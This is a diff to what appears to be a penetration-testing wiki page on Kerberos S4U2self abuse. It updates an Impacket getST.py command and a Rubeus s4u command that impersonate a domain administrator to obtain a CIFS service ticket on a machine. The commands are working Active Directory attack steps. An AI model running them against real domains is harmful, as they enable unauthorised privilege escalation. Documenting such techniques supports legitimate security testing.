@@ -66,7 +66,7 @@ From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s
 
 ```bash
 export KRB5CCNAME="/path/to/ticket.ccache"
-getST.py -self -spn "cifs/machine.domain.local" -impersonate "DomainAdmin" -k -no -pass -dc-ip "DomainController" "domain.local"/'machine$' 
+getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no -pass -dc-ip "DomainController" "domain.local"/'machine$' 
 ```
 {% endtab %}
 
@@ -74,7 +74,7 @@ getST.py -self -spn "cifs/machine.domain.local" -impersonate "DomainAdmin" -k -n
 From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
 
 ```powershell
-Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /ticket:"base64ticket"
+Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
 ```
 {% endtab %}
 {% endtabs %}
